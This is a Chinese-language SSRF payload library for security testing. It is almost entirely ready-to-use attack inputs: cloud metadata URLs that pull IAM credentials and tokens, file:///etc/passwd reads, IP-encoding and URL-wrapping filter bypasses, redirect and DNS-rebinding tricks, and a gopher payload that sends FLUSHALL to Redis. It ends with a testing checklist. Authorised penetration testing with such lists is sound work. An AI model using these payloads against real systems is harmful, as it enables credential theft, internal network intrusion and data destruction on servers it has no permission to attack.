# SSRF 攻击载荷库

> 用于 A2 注入测试的 SSRF 专项扩展。
> SSRF = Server-Side Request Forgery（服务端请求伪造）

---

## 基本探针

### 内网探测

```
http://127.0.0.1/
http://127.0.0.1:22/
http://127.0.0.1:3306/
http://127.0.0.1:6379/
http://127.0.0.1:8080/
http://127.0.0.1:9200/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://[::]:80/
```

### 内网 IP 范围扫描

```
http://10.0.0.1/
http://10.0.0.254/
http://172.16.0.1/
http://172.31.255.254/
http://192.168.0.1/
http://192.168.255.254/
http://169.254.169.254/latest/meta-data/   # AWS metadata (重点关注!)
```

---

## 云元数据服务

### AWS (169.254.169.254)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/
```

### GCP

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### 阿里云

```
http://100.100.100.200/latest/meta-data/
```

### 腾讯云

```
http://metadata.tencentyun.com/latest/meta-data/
```

---

## 绕过技术

### IP 表示变体

```
# 十进制 IP
http://2130706433/          # = 127.0.0.1

# 八进制
http://0177.0.0.1/          # = 127.0.0.1

# 十六进制
http://0x7f.0x0.0x0.0x1/    # = 127.0.0.1

# 混合
http://127.0.0.1.xip.io/    # DNS 解析到 127.0.0.1
http://localtest.me/         # 解析到 127.0.0.1
```

### URL 包装

```
# @ 符号：前面的部分被视为认证信息
http://evil.com@127.0.0.1/

# URL 编码
http://127.0.0.1%2fadmin

# 双重编码
http://127.0.0.1%252fadmin

# Unicode 规范化
http://127.0.0.1／admin   # 全角斜线
```

### 重定向链

```
# 301/302 重定向
Request: http://safe.com/redirect?url=http://127.0.0.1/
Response: 302 → Location: http://127.0.0.1/
→ 如果 SSRF 客户端跟随重定向，实际请求了 127.0.0.1
```

### DNS Rebinding

```
# 第一个响应：evil.com → 外部 IP
# 第二个响应：evil.com → 127.0.0.1
→ 绕过首次 DNS 检查
```

### 协议走私

```
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
ftp://127.0.0.1:21/
ldap://127.0.0.1:389/
```

---

## 非 HTTP SSRF

```
# 文件协议
file:///etc/passwd
file:///c:/windows/system.ini

# Redis（未授权访问）
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

# 数据库端口探测
http://127.0.0.1:3306/  # MySQL
http://127.0.0.1:5432/  # PostgreSQL
http://127.0.0.1:27017/ # MongoDB
```

---

## SSRF 测试 Checklist

- [ ] 探测 localhost / 127.0.0.1
- [ ] 探测内网 IP 段（10.x, 172.16-31.x, 192.168.x）
- [ ] 尝试云元数据端点（AWS/GCP/Azure/阿里/腾讯）
- [ ] 尝试 IP 表示变体绕过
- [ ] 尝试 URL 编码绕过
- [ ] 尝试重定向链
- [ ] 尝试非 HTTP 协议（file/dict/gopher）
- [ ] 尝试 DNS Rebinding
